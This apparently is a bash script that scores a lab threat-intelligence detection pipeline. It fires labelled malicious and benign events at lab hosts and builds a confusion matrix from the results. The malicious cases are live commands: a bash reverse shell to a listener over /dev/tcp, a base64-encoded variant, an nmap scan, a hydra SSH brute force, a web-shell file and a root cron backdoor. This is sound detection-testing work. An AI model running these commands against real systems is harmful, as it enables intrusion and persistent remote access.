#!/bin/bash
# Run a labelled stream of malicious + benign events and score each outcome into a
# confusion matrix (trigger=positive). Output: results/confusion/{per_event.jsonl,
# matrix.json}. Env: RUNS per (scenario,label). Optional args: scenarios to run.
set -uo pipefail

source "$(dirname "${BASH_SOURCE[0]}")/../experiments.env"
CONTROLLER="$SSH_CONTROLLER"; ATTACKER="$SSH_ATTACKER"
WEBSERVER="$SSH_WEBSERVER"; WORKSTATION="$SSH_WORKSTATION"
TARGET_USER="$LAB_USER"
RUNS="${RUNS:-10}"
RESULTS_DIR="$(pwd)/results/confusion"
DEFAULT_SCENARIOS="web_shell cron_persistence reverse_shell base64_exec port_scan ssh_brute_force"
SCENARIOS="${*:-$DEFAULT_SCENARIOS}"
PAYLOAD=$(echo -n "bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1" | base64)
# ========================================================

CTRL="$CONTROLLER"; ATK="$ATTACKER"; WEB="$WEBSERVER"; WS="$WORKSTATION"
mkdir -p "$RESULTS_DIR"
EVENTS_FILE="$RESULTS_DIR/per_event.jsonl"
: > "$EVENTS_FILE"

settle_for() { case "$1" in ssh_brute_force) echo 45;; port_scan) echo 30;; *) echo 25;; esac; }
cooldown_for() { case "$1:$2" in
  port_scan:malicious|ssh_brute_force:malicious) echo 75;;
  cron_persistence:*) echo 15;; *) echo 8;; esac; }

reset_block_state() {
  $CTRL "cd /opt/automated-ti-pipeline && sudo ansible endpoints -i $INVENTORY -m shell \
    -a 'iptables -D INPUT -s $ATTACKER_IP -j DROP -m comment --comment ti-pipeline 2>/dev/null; \
        iptables -D OUTPUT -d $ATTACKER_IP -j DROP -m comment --comment ti-pipeline 2>/dev/null; \
        true' -b" >/dev/null 2>&1 || true
  $CTRL "sudo python3 -c \"import json,pathlib; p=pathlib.Path('/var/log/ti-pipeline/blocked.json'); \
    d=json.loads(p.read_text()) if p.exists() else {}; d.pop('$ATTACKER_IP',None); \
    p.write_text(json.dumps(d,indent=2))\"" >/dev/null 2>&1 || true
}

pre_clean() { case "$1" in
  port_scan) reset_block_state; $ATK "sudo pkill -f nmap" 2>/dev/null || true;;
  ssh_brute_force) reset_block_state; $ATK "pkill -f hydra" 2>/dev/null || true;;
  web_shell) $WEB "sudo rm -f /var/www/html/conf_*.php /var/www/html/conf_*.html \
    /var/quarantine/*conf_*" 2>/dev/null || true;;
  reverse_shell|base64_exec) $CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true;
    $WS "sudo pkill -f 'bash -i'" 2>/dev/null || true;;
  cron_persistence) $WS "sudo rm -f /etc/cron.d/conf_backdoor /etc/cron.d/conf_legit" 2>/dev/null || true;;
esac; sleep 2; }

launch_malicious() { local i="$2"; case "$1" in
  port_scan) $ATK "sudo nohup nmap -sS -p 1-1000 -T4 $WEBSERVER_IP >/dev/null 2>&1 &" 2>/dev/null;;
  ssh_brute_force) $ATK "nohup hydra -l $TARGET_USER -P /tmp/bf_wordlist.txt -t 4 ssh://$WEBSERVER_IP >/dev/null 2>&1 &" 2>/dev/null;;
  web_shell) $WEB "echo '<?php echo 1; ?>' | sudo tee /var/www/html/conf_$i.php >/dev/null" 2>/dev/null;;
  reverse_shell) $CTRL "timeout 30 nc -lvp $LISTENER_PORT >/dev/null 2>&1 &" 2>/dev/null; sleep 1;
    $WS "sudo bash -c 'nohup bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1 &'" 2>/dev/null;;
  base64_exec) $CTRL "timeout 30 nc -lvp $LISTENER_PORT >/dev/null 2>&1 &" 2>/dev/null; sleep 1;
    $WS "sudo bash -c 'echo $PAYLOAD | base64 -d >/dev/null; nohup bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1 &'" 2>/dev/null;;
  cron_persistence) $WS "echo '* * * * * root /tmp/backdoor.sh' | sudo tee /etc/cron.d/conf_backdoor >/dev/null" 2>/dev/null;;
esac; }

launch_benign() { local i="$2"; case "$1" in
  port_scan) $WS "for k in \$(seq 1 15); do curl -s -o /dev/null --connect-timeout 2 http://$WEBSERVER_IP/ & done; wait" 2>/dev/null;;
  ssh_brute_force) $WS "for k in 1 2; do ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no wronguser@$WEBSERVER_IP true 2>/dev/null || true; done" 2>/dev/null;;
  web_shell) $WEB "echo '<html>ok</html>' | sudo tee /var/www/html/conf_$i.html >/dev/null" 2>/dev/null;;
  reverse_shell) $WS "bash -c 'ls /tmp >/dev/null; sleep 2'" 2>/dev/null;;
  base64_exec) $WS "echo hello | base64 >/dev/null" 2>/dev/null;;
  cron_persistence) $WS "echo '0 3 * * * root /usr/bin/apt-get update -q' | sudo tee /etc/cron.d/conf_legit >/dev/null" 2>/dev/null;;
esac; }

check_trigger() {  # prints matched rule name if any dispatch happened after $1
  $CTRL "sudo python3 -c \"
import json
start='$1'
for line in open('/var/log/ti-pipeline/integrator.log'):
    line=line.strip()
    if not line: continue
    d=json.loads(line)
    if d.get('t','')>start and d.get('matched') is not None:
        print(d.get('matched')); break
\"" 2>/dev/null
}

record() {  # scenario label predicted matched
  python3 -c "import json;print(json.dumps({'scenario':'$1','label':'$2','predicted':'$3','matched':'$4' or None}))" \
    >> "$EVENTS_FILE"
}

$ATK "seq 1 25 | sed 's/^/wrongpass/' > /tmp/bf_wordlist.txt" 2>/dev/null || true

for scen in $SCENARIOS; do
  for label in malicious benign; do
    settle="$(settle_for "$scen")"; cd_s="$(cooldown_for "$scen" "$label")"
    echo "===================== $scen / $label ====================="
    for i in $(seq 1 "$RUNS"); do
      $CONTROLLER true 2>/dev/null || { echo "  lab unreachable (VPN down?) - aborting"; break 3; }
      pre_clean "$scen"
      t_start="$($CTRL "date -Iseconds" 2>/dev/null)"
      [ "$label" = malicious ] && launch_malicious "$scen" "$i" || launch_benign "$scen" "$i"
      sleep "$settle"
      matched="$(check_trigger "$t_start")"
      [ -n "$matched" ] && predicted="trigger" || predicted="no_trigger"
      echo "  $scen/$label run $i/$RUNS -> $predicted ${matched:+($matched)}"
      record "$scen" "$label" "$predicted" "$matched"
      sleep "$cd_s"
    done
  done
done

# final tidy-up + matrix
reset_block_state
$CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true
$WS "sudo pkill -f 'bash -i'; sudo rm -f /etc/cron.d/conf_backdoor /etc/cron.d/conf_legit" 2>/dev/null || true
$WEB "sudo rm -f /var/www/html/conf_*.php /var/www/html/conf_*.html /var/quarantine/*conf_*" 2>/dev/null || true

echo ""
echo "===================== CONFUSION MATRIX ====================="
python3 "$(dirname "$0")/confusion_matrix.py" "$EVENTS_FILE"
